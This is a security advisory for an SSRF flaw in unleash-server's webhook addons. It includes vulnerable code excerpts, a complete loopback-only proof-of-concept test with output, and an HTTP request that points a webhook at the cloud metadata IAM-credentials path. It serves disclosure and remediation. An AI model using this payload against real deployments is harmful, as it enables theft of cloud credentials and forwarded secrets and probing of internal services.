# [M] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers

## Summary
Severity: Medium
Advisory: GHSA-5vf6-jrqr-78fj
CVE: CVE-2026-63004
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-5vf6-jrqr-78fj
Type: github-advisory

## Affected
- npm: `unleash-server` — affected >=0 <7.5.2
- npm: `unleash-server` — affected >=7.6.0 <7.6.5
- npm: `unleash-server` — affected >=8.0.0 <8.0.2

## Details
## Summary

Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target `url` parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's `parameters.url` and passed straight to the HTTP client (`ky`) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example `http://169.254.169.254/latest/meta-data/…` (cloud IMDS), `http://127.0.0.1:<port>/…` (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.

The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured `Authorization` header and arbitrary `customHeaders` to whatever host the `url` points at (Datadog forwards `DD-API-KEY`), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.

Creating/updating addons is gated by the root permissions `CREATE_ADDON` / `UPDATE_ADDON`. These are not the super-admin `ADMIN` permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.

## Affected code (v8.0.0)

The base addon issues the outbound request with the raw URL and no host checks (`src/lib/addons/addon.ts`):

```ts
async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise<Response> {
    try {
        const res = await ky(url, {            // <-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
```

The webhook provider passes the operator-supplied `parameters.url` (and forwards `authorization` + `customHeaders`) directly into that sink (`src/lib/addons/webhook.ts`):

```ts
const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // <-- configured secret forwarded to `url`
        ...extraHeaders,                              // <-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // <-- server dials attacker-chosen host
```

The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (`src/lib/services/addon-service.ts` → `validateKnownProvider`, `validateRequiredParameters`). The addon parameter schema (`src/lib/services/addon-schema.ts`) treats `url` as a free-form string; the `type: 'url'` field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of `src/lib/addons` and `addon-service.ts` for `169.254`, `127.0`, `localhost`, `private`, `ssrf`, `isAllowed`, `validateUrl` returns zero guards. The same unguarded `fetchRetry(url, …)` sink backs the Slack, Teams, Datadog, and New Relic providers.

The route gate (`src/lib/routes/admin-api/addon.ts`) requires the root permission `CREATE_ADDON` (create) / `UPDATE_ADDON` (update); `src/lib/types/permissions.ts` lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from `ADMIN`.

## Attacker model / precondition

The attacker is an authenticated Unleash user (or an admin API token) holding the root permission `CREATE_ADDON` or `UPDATE_ADDON`. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with `parameters.url` set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.

## Impact

The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (`169.254.169.254`) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured `Authorization` header and any `customHeaders` (and, for the Datadog provider, the `DD-API-KEY`) to the attacker-chosen host, since those headers are sent to whatever `url` is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.

## Proof of Concept (complete — runs on 127.0.0.1 only)

This PoC drives the **real** `WebhookAddon.handleEvent` from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured `Authorization` and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.

### Setup

```bash
# In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
```

### File 1 — `vitest.poc.config.ts` (project root)

The repo's default vitest config has a Postgres `globalSetup`; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.

```ts
import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
```

### File 2 — `src/lib/addons/ssrf-poc.test.ts`

```ts
// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () => {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) => false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise<{
    url: string;
    hits: Array<{ path: string; auth?: string; secret?: string; body: string }>;
    close: () => Promise<void>;
}> {
    const hits: Array<{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }> = [];
    return new Promise((resolve) => {
        const server = http.createServer((req, res) => {
            let body = '';
            req.on('data', (c) => (body += c));
            req.on('end', () => {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () => {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =>
                    new Promise((r) => server.close(() => r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () => {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () => {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -> internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () => {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -> proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
```

### Run

```bash
npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
```

### Observed output (real run against v8.0.0)

```
 RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -> internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

The internal loopback listener received the request (`path` = the metadata path), with the configured `Authorization: Bearer operator-webhook-secret` and `X-Internal-Secret: leaked-to-internal-host` headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: `POST /api/admin/addons` with `{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }` (requires `CREATE_ADDON`), then create any feature flag to trigger the outbound request.

## Remediation

Validate the addon `url` server-side before it is ever dialed, both at create/update time (`addon-service.ts`) and again at request time (`addon.ts` `fetchRetry`). Specifically: require `http`/`https` only; resolve the hostname and reject the request if any resolved address is loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`, including the `169.254.169.254`/`fd00:ec2::254` metadata addresses), private (`10/8`, `172.16/12`, `192.168/16`, `fc00::/7`), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a `30x` cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on `Addon.fetchRetry` (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured `Authorization`/`customHeaders` to non-allow-listed hosts to contain credential leakage.

Please credit 5ud0 / Tarmo Technologies.

## References
- https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj
- https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1
- https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1
- https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d
- https://github.com/Unleash/unleash
- https://github.com/Unleash/unleash/releases/tag/v7.5.2
- https://github.com/Unleash/unleash/releases/tag/v7.6.5
- https://github.com/Unleash/unleash/releases/tag/v8.0.2
